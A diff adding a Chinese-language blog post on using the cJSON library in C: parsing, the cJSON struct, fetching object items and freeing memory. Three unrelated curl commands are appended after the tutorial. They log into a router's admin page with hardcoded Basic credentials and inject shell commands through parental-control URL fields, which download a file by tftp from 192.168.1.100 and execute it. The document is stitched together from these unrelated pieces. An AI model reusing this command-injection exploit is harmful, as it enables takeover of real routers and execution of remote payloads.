@@ -1,0 +1,46 @@
+#+TITLE: cJSON库的使用
+#+DATE: 2017-04-24
+#+LAYOUT: post
+#+TAGS: JSON
+#+CATEGORIES: JSON
+
+* 前言
+  cJSON在openwrt中使用，和前端交互时使用比较多。其基本的使用也很简单，数据结构也很简单。json每个对象都是一个名字
+* 解析
+** 构建JSON数据结构cJSON
+   有两种方法，一种是parse字符串来得到，即：
+   #+BEGIN_SRC C
+   cJSON* root = cJSON_Parse(my_json_string);
+   #+END_SRC
+   cJSON的定义是：
+   #+BEGIN_SRC C
+     typedef struct cJSON {
+         struct cJSON *next,*prev;
+         struct cJSON *child;
+
+         int type;
+
+         char *valuestring;
+         int valueint; /* writing to valueint is DEPRECATED, please use cJSON_SetNumberValue instead */
+         double valuedouble;
+
+         char *string;
+     } cJSON;
+   #+END_SRC
+   可以看到cJSON其实是一棵N-tree
+   数组的关键没有名称，只能用索引引用。对于cjson中的数组和对象起始数据结构上没有本质区别，只在与索引方式。
+** 查询数据结构的内容
+   首先，要了解数据结构的内容，cJSON的每一项都是cJSON，没有树叶，所以值要从中获取，但是我们没法知道是否是树叶，所以要手动确认。得到子对象的方法是使用cJSON_GetObjectItem，得到一个新的
+   #+BEGIN_SRC C
+   cJSON_GetObjectItem(format, "frame rate")
+   #+END_SRC
+   以功能而言是将指针指向的，双向链表便利一遍。其实一个object指的是一个链表，
+   一个节点有三种语义：对象、数字、字符串。它们使用一个字段名来引用
+** 析构数据结构
+   c没有自动内存管理，所以要手动析构，使用函数cJSON_Delete(root);
+
+sudo curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true' 'http://192.168.1.1/'
+
+sudo curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1&parent_mac_addr=00-00-00-00-00-02&Page=1'
+
+curl -o - -b 'tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=' --referer 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0&Page=1' 'http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01&lan_lists=888&url_comment=test&url_0=;cd%20/tmp;&url_1=;tftp%20-gl%20aa%20192.168.1.100;&url_2=;sh%20aa;&url_3=&url_4=&url_5=&url_6=&url_7=&scheds_lists=255&enable=1&Changed=1&SelIndex=0&Page=1&rule_mode=0&Save=%B1%A3+%B4%E6'
